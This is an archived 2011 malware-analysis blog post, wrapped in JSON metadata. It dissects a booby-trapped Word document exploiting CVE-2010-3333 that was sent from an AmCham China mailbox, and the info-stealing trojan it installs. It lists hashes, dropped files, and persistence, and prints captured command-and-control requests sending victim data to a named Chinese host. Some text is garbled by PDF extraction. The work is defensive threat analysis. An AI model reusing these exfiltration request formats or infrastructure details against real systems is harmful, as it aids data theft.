{
    "id": "570d3f59-012d-47b7-b760-56f431d3c93e",
    "created_at": "2023-01-12T15:02:06.187809Z",
    "updated_at": "2025-03-27T02:05:49.357157Z",
    "deleted_at": null,
    "sha1_hash": "83bf06e4585bae62877ba1a6c13310895b04aedf",
    "title": "2011-01-09 - Jan 6 CVE-2010-3333 DOC with info theft trojan from the American Chamber of Commerce",
    "authors": "",
    "file_creation_date": "2022-05-28T17:15:23Z",
    "file_modification_date": "2022-05-28T17:15:23Z",
    "file_size": 1129649,
    "plain_text": "# Jan 6 CVE-2010-3333 DOC with info theft trojan from the American Chamber of Commerce\n\n**contagiodump.blogspot.com/2011/01/jan-6-cve-2010-3333-with-info-theft.html**\n\n## Common Vulnerabilities and Exposures (CVE)number\n\n CVE-2010-3333 Stack-based buffer overflow in Microsoft Office XP SP3, Office 2003 SP3, Office 2007 SP2, Office 2010, Office 2004 and 2008 for Mac, Office for Mac 2011, and Open XML File Format Converter for Mac allows remote attackers to execute arbitrary code via crafted RTF data, aka \"RTF Stack Buffer Overflow Vulnerability\n\n Please read a technical analysis of this vulnerability on the Microsoft Threat Research & Response Blog Targeted attacks against recently addressed Microsoft Office vulnerability (CVE-2010-3333/MS10-087) 29 Dec 2010 12:10 PM\n\n This particular exploit was tested on and successfully exploits Office 2003 and 2007 without the patch.\n\n  General File Information\n\n File Three Big Risks to China's Economy In 2011.doc\n MD5 5A0AAC44DDAAD1E512A0D505C217BAFF\n SHA1 ab6f90bf582bf01985989c1e9a99932243402479 File size :51643\n Type: DOC\n Distribution: Email attachment\n\n Download\n\nThe message came from the American Chamber of Commerce in China. The interesting thing about this message is that the sender is not\nspoofed and the headers are real, which means that the message indeed came from the mailbox of the sender @amchamchina.org, who also\n[happens to be a real person working at amchamchina.org - can be easily found in Google searches. The sender name and address do not](http://www.amchamchina.org/)\nmatch the message signature. I have removed part of the sender's name for privacy reasons.\n\nIn this case, there are three possible scenarios:\n\na) someone broke into that employee mailbox and sent the malicious message (in this case, I hope the IT staff at the American Chamber\nof Commerce in China see this post and fix the problem)\nb) the sender sent a malicious attachment not realizing it is malicious (less likely, as the attached Word document does not display\nreadable text),\nc) the sender sent the malicious message on purpose (..)\nWe may never know how that happened but hope it is a case of a mailbox password compromise.\n\nThe files created by the malicious attachment generate traffic to a server in China.\n\nUpon opening, the file will dispay garbage text if the attack fails (fully patched MS Office) and will just close without displaying any document if\nthe exploit is successful.\n\nThe trojan that gets installed is designed for stealing information from the infected computer - files and passwords - see the detailed analysis\nbelow.\n\n\n-----\n\nead o e\n\n## Original Message\n\nFrom: SXXX WXXXXX [mailto:XXXXX@amchamchina.org]\n\nSent: Thursday, January 06, 2011 8:46 PM\n\nTo: XXXXXXXXXXX\n\nSubject: Three Big Risks to China's Economy In 2011\n\nDear XXXXX:\n\nPlease kindly find the attachment for your need.\n\nIf you have any question please let me know.\n\nBest regards,\n\nUlan Tuya\n\nSenior Communications Manager\n\n86-10-8519-0835\n\nutuya@amchamchina.org\n\n***************************\n\nAmCham-China is a non-partisan and independent non-profit organization representing the interests of some 2,600 companies and individuals\ndoing\n\nbusiness throughout China. Formally recognized by China’s Ministry of Civil Affairs in 1991, AmCham-China is the leader at promoting\nAmerican\n\nbusiness interests in China. Headquartered in Beijing, with chapters in Central China (Wuhan) Tianjin and Dalian, the Chinese government\nrecognizes\n\nAmCham-China as America’s official chamber of commerce.\n\n## Message Headers\n\nReceived: (qmail 12375 invoked from network); 7 Jan 2011 01:46:31 -0000\n\nReceived: from mail.amchamchina.org (HELO amcham.amchamchina.org) (122.200.77.250)\n\nby XXXXXXXXXXXXXXXX with RC4-SHA encrypted SMTP; 7 Jan 2011 01:46:31 -0000\n\nReceived: from AMCMAIL.amchamchina.org ([122.200.77.246]) by\n\namcham.amchamchina.org ([122.200.77.250]) with mapi; Fri, 7 Jan 2011 09:48:21\n\n+0800\n\nFrom: SXXX WXXX\n\nTo: XXXXXXXXXXXXXX\n\nDate: Fri, 7 Jan 2011 09:46:17 +0800\n\nSubject: Three Big Risks to China's Economy In 2011\n\n\n-----\n\nead op c ee g s s to C a s co o y 0\nThread-Index: AQHLrgx3tarISKEiT0OWHRNyijQ+D5PEvUAO\nMessage-ID: <146350E596927B48A9D8F7B0464B167F1762C211CB@AMCMAIL.amchamchina.org>\nReferences: <146350E596927B48A9D8F7B0464B167F1762C211CA@AMCMAIL.amchamchina.org>\nIn-Reply-To: <146350E596927B48A9D8F7B0464B167F1762C211CA@AMCMAIL.amchamchina.org>\nAccept-Language: zh-CN, en-US\nContent-Language: zh-CN\nX-MS-Has-Attach: yes\nX-MS-TNEF-Correlator:\nacceptlanguage: zh-CN, en-US\nx-tm-as-product-ver: SMEX-8.0.0.4125-6.500.1024-17878.000\nx-tm-as-result: No--40.303000-0.000000-31\nx-tm-as-user-approved-sender: Yes\nx-tm-as-user-blocked-sender: No\nContent-Type: multipart/mixed;\nboundary=\"_004_146350E596927B48A9D8F7B0464B167F1762C211CBAMCMAILamcham_\"\nMIME-Version: 1.0\n\n## Sender\n\n IP Information for 122.200.77.250\n\nIP Location: China Beijing Beijing Heju Shuzi Telecom Engineering Co.ltd\n\n**Resolve Host:** **[mail.amchamchina.org](http://whois.domaintools.com/amchamchina.org)**\n\nIP Address: 122.200.77.250\n\ninetnum:    122.200.64.0 - 122.200.127.255\n\nnetname:    LTEL\n\ndescr:     LONGTEL NETWORKS & TECHNOLOGIES LTD.\ndescr:     Room 601£¬Block B£¬Thunis Development Building\n\ndescr:     No.11 HuiXin East Street,Chaoyang District,\n\ndescr:     Beijing,100029,P.R.C.\n\nchanged: 20080324\n\nsource:     APNIC\n\nperson:     Wang Dan\n\nnic-hdl:    WD501-AP\n\ne-mail:\n\naddress:    LONGTEL NETWORKS & TECHNOLOGIES LTD.\n\naddress:    Room 601 Block B Thunis Development Building\n\naddress:    No.11 HuiXin East Street,\n\naddress:    Chaoyang District,Beijing,100029,P.R.C.\n\nphone:     +86-10-64823381\n\nfax-no:     +86-10-64823885\n\ncountry:    CN\n\nchanged: 20070910\n\nmnt-by:     MAINT-NEW\n\nsource:     APNIC\n\nperson:     Ren Weidong\n\nnic-hdl:    RW432-AP\n\ne-mail:\n\naddress:    LONGTEL NETWORKS & TECHNOLOGIES LTD.\n\naddress:    Room 601 Block BThunis Development Building\n\naddress:    No.11 HuiXin East Street,\n\naddress:    Chaoyang District,Beijing,100029,P.R.C.\n\nphone:     +86-10-64823381\n\nfax-no:     +86-10-64823885\n\ncountry:    CN\n\nchanged: 20070910\n\nmnt-by:     MAINT-NEW\n\nsource: APNIC\n\n\n-----\n\n## Automated Scans\n\nFile name: Three Big Risks to China's Economy In 2011.doc\n\nhttp://www.virustotal.com/file-scan/report.html?id=dc1e0b63020d586526320c0bc0f44862ba34f84fb4697e13037d3d4ff54718a11294403371Submission date: 2011-01-07 12:29:31 (UTC)\n\nResult: 7 /43 (16.3%)\n\nAvast 4.8.1351.0 2011.01.06 RTF:CVE-2010-3333\n\nAvast5 5.0.677.0 2011.01.06 RTF:CVE-2010-3333\n\nClamAV 0.96.4.0 2011.01.07 BC.Exploit.CVE_2010_3333\n\nGData 21 2011.01.07 RTF:CVE-2010-3333\n\nMcAfee 5.400.0.1158 2011.01.07 Exploit-CVE2010-3333\n\nMicrosoft 1.6402 2011.01.07 Exploit:Win32/CVE-2010-3333\n\nSophos 4.61.0 2011.01.07 Exp/20103333-A\n\nMD5  : 5a0aac44ddaad1e512a0d505c217baff\n\nSHA1 : ab6f90bf582bf01985989c1e9a99932243402479\n\nSHA256: dc1e0b63020d586526320c0bc0f44862ba34f84fb4697e13037d3d4ff54718a1\n\nssdeep: 768:vAL60V502HFUDmGIFmwFrKBqQA7bzmqhe6XQKOWM2xs/gSdlY:vS60V6BhIE8rKAQWzS6gK\n\nOWeIl\n\nFile size : 51643 bytes\n\nFirst seen: 2011-01-07 12:29:31\n\nLast seen : 2011-01-07 12:29:31\n\nMagic: Rich Text Format data, version 1, unknown character set\n\nTrID:\n\nRich Text Format (100.0%)\n\n## Files Created\n\nFile: userinit.exe\n\nSize: 49664\n\nMD5: 20DD4DD02C2B17A40B26843AA0C660F6\n\n[Virustotal](http://www.virustotal.com/file-scan/report.html?id=5ff635c90ed17ac58796ae278ed00db652fafc65a4720baa572333dbc9b876ed-1294403831)\n\nFile name: userinit.exe\n\nSubmission date: 2011-01-07 12:37:11 (UTC)\n\nResult: 6 /42 (14.3%)\n\nAvast 4.8.1351.0 2011.01.07 Win32:Malware-gen\n\nAvast5 5.0.677.0 2011.01.06 Win32:Malware-gen\n\nDrWeb 5.0.2.03300 2011.01.07 Trojan.MulDrop1.47445\n\nF-Secure 9.0.16160.0 2011.01.07 Gen:Trojan.Heur.LP.cu5@a8zokfo\n\nGData 21 2011.01.07 Win32:Malware-gen\n\nJiangmin 13.0.900 2011.01.07 Trojan/Genome.epw\nMD5  : 20dd4dd02c2b17a40b26843aa0c660f6\n\nFile: userinit.dll\n\n[http://www.virustotal.com/file-scan/report.html?id=40aecc6024f83fa2f7b1fdc0b0bcb765d32c62a0b6909dd1ab4821b1f3c64d3f-1294426448](http://www.virustotal.com/file-scan/report.html?id=40aecc6024f83fa2f7b1fdc0b0bcb765d32c62a0b6909dd1ab4821b1f3c64d3f-1294426448)\n\nSize: 40960\n\nMD5: DC574F47A55E022C32A12F55EEC16CC7\n\nFile name: userinit.dll\n\nSubmission date: 2011-01-07 18:54:08 (UTC)\n\nResult: 7 /43 (16.3%)\n\nAvast 4.8.1351.0 2011.01.07 Win32:Malware-gen\n\nAvast5 5.0.677.0 2011.01.07 Win32:Malware-gen\n\nBitDefender 7.2 2011.01.07 Gen:Trojan.Heur.LP.cu4@a8zokfo\n\nComodo 7327 2011.01.07 TrojWare.Win32.PSW.Delf.~JHN\n\nF-Secure 9.0.16160.0 2011.01.07 Gen:Trojan.Heur.LP.cu4@a8zokfo\n\nGData 21 2011.01.07 Gen:Trojan.Heur.LP.cu4@a8zokfo\n\nPanda 10.0.2.7 2011.01.07 Suspicious file\n\nMD5  : dc574f47a55e022c32a12f55eec16cc7\n\nCreated files\n\nC:\\Documents and Settings\\mila\\Local Settings\\Application Data\\Windows\\userinit.dll   MD5: DC574F47A55E022C32A12F55EEC16CC7\n\nC:\\Documents and Settings\\mila\\Local Settings\\Application Data\\Windows\\userinit exe MD5: 20DD4DD02C2B17A40B26843AA0C660F6\n\n\n-----\n\nC \\ ocu e ts a d Sett gs\\ a\\Sta t e u\\ og a s\\Sta tup\\use t e e 5 0 0 C 0 68 3 0C660 6\nC:\\Documents and Settings\\All Users\\Application Data\\desktop.BIN ``      MD5: 20DD4DD02C2B17A40B26843AA0C660F6\n\n**Userinit.exe additional information**\n\n[I want to thank Andre' M. DiMino of the Shadowserver Foundation and villy of](http://www.shadowserver.org/) [Bugix Security for their help and information](http://bugix-security.blogspot.com/)\n\nSee Anubis and Joe box reports for more details. Here are a few notes:\n\n1. I did not observe any changes in registry . The persistence is achieved via relaunching the binary from the infected user startup folder\n\n(Start Menu\\Programs\\Startup\\userinit.exe), also the there is a copy of the file gets created as All Users\\Application Data\\desktop.BIN\n2. Userinit.exe creates folder logs in %userprofile%\\Local Settings\\Application Data\\Windows\\Logs. A shortcut like in the image below\n\nshows up in that directory for a split second but I did not capture it. This is the file that gets transmitted with HTTP POST, M DAwMGhIR\nUwuMDk in meta part of the URL string can be decoded as meta=0000hHEL.09\n\n**POST /wi ndowsupd atev7/se arch%3Fh l%3DSABB AE4AUwA% 3D%26q%3 DMQA5ADI ALgAxADY AOAAuADI ALgAyAA%\n3D%3D%26 meta%3DM DAwMGhIR UwuMDk%3 D%26id%3 Dlfdxfir cvscxggb HTTP/1. 1.\n\n**_The last part -lfdxfir cvscxggb - is changing with each GET request and is possibly an encoded directories names on the victim pc_**\n(thanks to Villy for the info here)\n\n3. See the Ascii strings below -. It appears the binary gathers the system info (Sysinfo.txt file gets created and deleted), IP address, and\n\nuser name for transmission to the remote server. The listing of file extensions (.doc.xls.pdf.rtf.eml.pgp.vpn.wab.csv.docx.xlsx +\n****Proxy info****Office info***IE info****Hotfix info****OS info**) is interesting. We did not observe any file transmissions but possibly**\nobtaining the files with the listed extensions is the end goal of the attackers.\n4. Villy provided the following info\n\n\"some strings encoded using simple encoding to bypass static analysis by AV\nto decode strings used the following aglorithm\nfor(i=0;i\nit's means that every byte in the string is decreased by number of its position in the string\nuserinit.dll - is a service\nand installed with svchost(SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\n\nIt also grabs protected storage -saved passwords from IE 6.0 and below), and saved outlook passwords, versions of MS Office and\nInternet Explorer\n\n5. Hooks userinit.dll into explorer.exe (only Explorer.exe for Windows XP box despite a large number of apps open and processes running) and\ninto multiple processes (observed on Windows 7 box\nWindows XP\n\nWindows 7\n\n\n-----\n\note t e t code o t e page d sp ayed upo s t g ttp //g oba at o te o go et/ do supdate\n\ncan be seen in the Ascii Strings of the binary\n\n..div align=\"center\"..Under Construction\n\n..div align=\"center\"..;www.microsoft.com\n\nAscii strings (partial) userinit.exe\n\n**Joe Box analysis report (thanks to Andre' M. DiMino) userinit.exe**\n\n[Download Joe Box Report for binary sandbox analysis on Windows 7](http://www.mediafire.com/?zfwsm4bw9vbdde1)\n[Download Joe Box Report for binary sandbox analysis on Windows XP](http://www.mediafire.com/?4bbfsyd2hvqv3vx)\n\n**Anubis scan report userinit.exe**\n[http://anubis.iseclab.org/?action=result&task_id=11c167a3ff87c2e24fd3e993d65ae2aae](http://anubis.iseclab.org/?action=result&task_id=11c167a3ff87c2e24fd3e993d65ae2aae)\n\n## Network activity\n\n[Download 114.248.83.92userinitJan7-11pm.pcap](http://www.mediafire.com/?d00azqza6b6ni02)\n[Download 123.120.107.46userinitbeforeJan710pm.pcap](http://www.mediafire.com/?5t2x47pvhikubk6)\n[Download the Anubis generated pcap file](http://www.mediafire.com/?a63m466d5f21n2m)\n```\n[=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=]\n  DNS Queries:\n    Name: [ globalization.interiorgov.net ], Query Type: [ DNS_TYPE_A ],\n      Query Result: [ 123.120.107.46 ], Successful: [ 1 ], Protocol: [ udp ]\n[=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=]\n  HTTP Conversations:\n to 123.120.107.46:80 - [ globalization.interiorgov.net ]\n       Request: [ GET /windowsupdatev7/search?hl=UABDAA==&q=MQA5ADIALgAxADYAOAAuADAALgAyAA==&meta=Lg==&id=phqghumeaylnlfd ],\nResponse: [ 200 \"OK\" ]\nto 123.120.107.46:80 - [ globalization.interiorgov.net ]\n       Request: [ GET /windowsupdatev7/search?hl=UABDAA==&q=MQA5ADIALgAxADYAOAAuADAALgAyAA==&meta=Li4=&id=xfircvscxggbwkf ],\nResponse: [ 200 \"OK\" ]\n\n```\n\n-----\n\n**Co te ts o t e** **eb se** **e** **obots t t** **e (t a** s to d e )\n畂灲瀠潲祸攠牲牯›慦汩摥琠潣湮捥⁴潴朠潬慢楬慺楴湯椮瑮牥潩杲癯渮瑥㠺ര\n\n**Domain:   interiorgov.net - Domain History**\nCache Date:   2011-01-03\nRegistrar:   NAME2HOST, INC. DBA NAME2HOST.COM\n\nServer:   whois.name2host.com\nCreated:   2010-09-07\nUpdated:   2010-09-07\nExpires:   2011-09-07\nqingwa20102010@163.com\nDomain name: INTERIORGOV.NET\nUpdated Date: 2010-09-08\nCreation Date: 2010-09-08\nExpiration Date: 2011-09-08\n\nRegistrar of Record: NAME2HOST, INC.\nDomain servers in listed order:\nDNS1.51.NET  118.144.82.171\nDNS2.51.NET  118.145.1.7\n\n**IP addresses**\nThe hosting IP address of the domain keeps changing but within the same provider\n\n**IP Address 1 - As recorded on January 7, 2011**\n\n**IP address 123.120.107.46**\ninetnum:   123.112.0.0 - 123.127.255.255\nnetname:   UNICOM-BJ\ndescr:    China Unicom Beijing province network\naddress:   No.21,Jin-Rong Street\naddress:   Beijing,100140\naddress:   P.R.China\nphone:    +86-10-66259940\nfax-no:    +86-10-66259764\n\nperson:    sun ying\naddress:   fu xing men nei da jie 97, Xicheng District\naddress:   Beijing 100800\n\nThere are usually 2-4 HTTP GET requests followed by one HTTP POST (12,000-20,000 bytes length), followed by many HTTP GET requests\nagain. I did not observe more than one HTTP POST per binary execution. The strings in HTTP GET requests are identical except for the last\npart \"id\" of the string (see this code in the binary ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\n/windowsupdatev7/search?hl=%s&q=%s&meta=%s&id=%s)\n\nExample 1\n\n\n-----\n\nG\n/windowsupdatev7/search%3Fhl%3DWABQAFMAUAAzAC0AUgA5ADMALQBPAEYAQwAyADAA%26q%3DMQA3ADIALgAyADkALgAwAC4\nHTTP/1.1\nGET\n/windowsupdatev7/search%3Fhl%3DWABQAFMAUAAzAC0AUgA5ADMALQBPAEYAQwAyADAA%26q%3DMQA3ADIALgAyADkALgAwAC4\nHTTP/1.1\nPOST\n/windowsupdatev7/search%3Fhl%3DWABQAFMAUAAzAC0AUgA5ADMALQBPAEYAQwAyADAA%26q%3DMQA3ADIALgAyADkALgAwAC4\nHTTP/1.1\nGET\n/windowsupdatev7/search%3Fhl%3DWABQAFMAUAAzAC0AUgA5ADMALQBPAEYAQwAyADAA%26q%3DMQA3ADIALgAyADkALgAwAC4\nHTTP/1.1\nGET\n/windowsupdatev7/search%3Fhl%3DWABQAFMAUAAzAC0AUgA5ADMALQBPAEYAQwAyADAA%26q%3DMQA3ADIALgAyADkALgAwAC4\nHTTP/1.1\nGET\n/windowsupdatev7/search%3Fhl%3DWABQAFMAUAAzAC0AUgA5ADMALQBPAEYAQwAyADAA%26q%3DMQA3ADIALgAyADkALgAwAC4\nHTTP/1.1\nGET\n/windowsupdatev7/search%3Fhl%3DWABQAFMAUAAzAC0AUgA5ADMALQBPAEYAQwAyADAA%26q%3DMQA3ADIALgAyADkALgAwAC4\nHTTP/1.1\nGET\n/windowsupdatev7/search%3Fhl%3DWABQAFMAUAAzAC0AUgA5ADMALQBPAEYAQwAyADAA%26q%3DMQA3ADIALgAyADkALgAwAC4\nHTTP/1.1\nGET\n/windowsupdatev7/search%3Fhl%3DWABQAFMAUAAzAC0AUgA5ADMALQBPAEYAQwAyADAA%26q%3DMQA3ADIALgAyADkALgAwAC4\nHTTP/1.1\nGET\n/windowsupdatev7/search%3Fhl%3DWABQAFMAUAAzAC0AUgA5ADMALQBPAEYAQwAyADAA%26q%3DMQA3ADIALgAyADkALgAwAC4\nHTTP/1.1\nGET\n/windowsupdatev7/search%3Fhl%3DWABQAFMAUAAzAC0AUgA5ADMALQBPAEYAQwAyADAA%26q%3DMQA3ADIALgAyADkALgAwAC4\nHTTP/1.1\nGET\n/windowsupdatev7/search%3Fhl%3DWABQAFMAUAAzAC0AUgA5ADMALQBPAEYAQwAyADAA%26q%3DMQA3ADIALgAyADkALgAwAC4\nHTTP/1.1\nGET\n/windowsupdatev7/search%3Fhl%3DWABQAFMAUAAzAC0AUgA5ADMALQBPAEYAQwAyADAA%26q%3DMQA3ADIALgAyADkALgAwAC4\nHTTP/1.1\nGET\n/windowsupdatev7/search%3Fhl%3DWABQAFMAUAAzAC0AUgA5ADMALQBPAEYAQwAyADAA%26q%3DMQA3ADIALgAyADkALgAwAC4\nHTTP/1.1\nGET\n/windowsupdatev7/search%3Fhl%3DWABQAFMAUAAzAC0AUgA5ADMALQBPAEYAQwAyADAA%26q%3DMQA3ADIALgAyADkALgAwAC4\nHTTP/1.1\n\nExample 2 The strings sometimes retransmit [TCP Retransmission] and you will see identical GET requests\n\n**GET /win dowsupda tev7/sea rch%3Fhl %3DSABBA E4AUwA%3 D%26q%3D MQA5ADIA LgAxADYA OAAuADIA LgAyAA%3 D%3D%26m\neta%3DLg %3D%3D%2 6id%3Dph qghumeay lnlfd HT TP/1.1\n**GET /win dowsupda tev7/sea rch%3Fhl %3DSABBA E4AUwA%3 D%26q%3D MQA5ADIA LgAxADYA OAAuADIA LgAyAA%3 D%3D%26m\neta%3DLi 4%3D%26i d%3Dxfir cvscxggb wkf HTTP /1.1\n**GET /win dowsupda tev7/sea rch%3Fhl %3DSABBA E4AUwA%3 D%26q%3D MQA5ADIA LgAxADYA OAAuADIA LgAyAA%3 D%3D%26m\neta%3DLi 4%3D%26i d%3Dxfir cvscxggb wkf HTTP /1.1\n**POST /wi ndowsupd atev7/se arch%3Fh l%3DSABB AE4AUwA% 3D%26q%3 DMQA5ADI ALgAxADY AOAAuADI ALgAyAA% 3D%3D%26\nmeta%3DM DAwMGhIR UwuMDk%3 D%26id%3 Dlfdxfir cvscxggb HTTP/1. 1\n\nStrings can be decoded\n\necho urldecode(\"GET\n/windowsupdatev7/search%3Fhl%3DWABQAFMAUAAzAC0AUgA5ADMALQBPAEYAQwAyADAA%26q%3DMQA3ADIALgAyADkALgAwAC4AMQ\nHTTP/1.1\");\n?>\n|||\n\n\n-----\n\nG / do supdate /sea c\nhl=WABQAFMAUAAzAC0AUgA5ADMALQBPAEYAQwAyADAA&q=MQA3ADIALgAyADkALgAwAC4AMQAxADYA&meta=Lg==&id=amyehwqnqrq\nHTTP/1.1\n\n_without %, %3d - =, %26 - &_\n|||\n\necho \"hl=\".base64_decode(\"WABQAFMAUAAzAC0AUgA5ADMALQBPAEYAQwAyADAA\").\"\\n\";\necho \"q=\".base64_decode(\"MQA3ADIALgAyADkALgAwAC4AMQAxADYA\").\"\\n\";\necho \"meta=\".base64_decode(\"Lg==&\").\"\\n\";\necho \"id=\".base64_decode(\"amyehwqnqrqpmxu\").\"\\n\";\n?>\n|||\nhl - compname(unicode string encoded with base64)\nq - ip address(unicode string encoded with base64)\nmeta - directory where search(base64 encoded)\nid - changing string, presumably a directory name on the victim's pc\n|||\nthe end result\n**hl=XPSP3-R93-OFC20**\n**q=172.29.0.116**\n\nAs mentioned above, M DAwMGhIR UwuMDk in meta part of the URL string can be decoded as meta=0000hHEL.09\n\n**POST /wi ndowsupd atev7/se arch%3Fh l%3DSABB AE4AUwA% 3D%26q%3 DMQA5ADI ALgAxADY AOAAuADI ALgAyAA% 3D%3D%26\nmeta%3DM DAwMGhIR UwuMDk%3 D%26id%3 Dlfdxfir cvscxggb HTTP/1. 1.\n\n**_The last part -lfdxfir cvscxggb - is changing with each GET request and is possibly an encoded directories names on the victim pc (thanks to_**\nVilly for his help with these)\n\n**IP Address 2 - Changed between 10 and 11pm January 7, 2011**\n**IP Address:  114.248.83.92**\nNetRange:   114.0.0.0 - 114.255.255.255\nnetname:   UNICOM-BJ\ndescr:    China Unicom Beijing province network\naddress:   No.21,Jin-Rong Street\naddress:   Beijing,100140\naddress:   P.R.China\nphone: +86 10 66259940\n\n\n-----\n\na o 86 0 66 59 6\nperson:    sun ying\naddress:   fu xing men nei da jie 97, Xicheng District\naddress:   Beijing 100800\n\nSSL traffic started for environment.interiorgov.net domain, and unlike globalization.interiorgov.net, environment subdomain is not hardcoded in\nthe binary downloaded from the server (see 114.248.83.92userinitJan7-11pm.pcap tcp.stream eq 3 - correction from Kyle Yung), all\ncommunications always start with globalization.interiorgov.net. Also, the SSL traffic was observed only for 114.248.83.92\n\nExample of SSL traffic\n\nThe following conversation between the server and the victim pc also takes place (thanks to Andre' DiMino for the capture :)\n\n\n-----\n\n**IP Address 3 - Changed before 9 am on January 8, 2011**\n**IP Address:  123.120.106.88**\ninetnum:   123.112.0.0 - 123.127.255.255\nnetname:   UNICOM-BJ\ndescr:    China Unicom Beijing province network\naddress:   No.21,Jin-Rong Street\naddress:   Beijing,100140\naddress:   P.R.China\nphone:    +86-10-66259940\nfax-no:    +86-10-66259764\nperson:    sun ying\naddress:   fu xing men nei da jie 97, Xicheng District\naddress:   Beijing 100800 The hosting history screenshot posted below does not include all the changes for the past two days\n\n\n-----\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2011/2011-01-09 - Jan 6 CVE-2010-3333 DOC with info theft trojan from the American Chamber of Commerce.pdf"
    ],
    "report_names": [
        "2011-01-09 - Jan 6 CVE-2010-3333 DOC with info theft trojan from the American Chamber of Commerce.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535726,
    "ts_updated_at": 1743041149,
    "ts_creation_date": 1653758123,
    "ts_modification_date": 1653758123,
    "files": {
        "pdf": "https://archive.orkl.eu/83bf06e4585bae62877ba1a6c13310895b04aedf.pdf",
        "text": "https://archive.orkl.eu/83bf06e4585bae62877ba1a6c13310895b04aedf.txt",
        "img": "https://archive.orkl.eu/83bf06e4585bae62877ba1a6c13310895b04aedf.jpg"
    }
}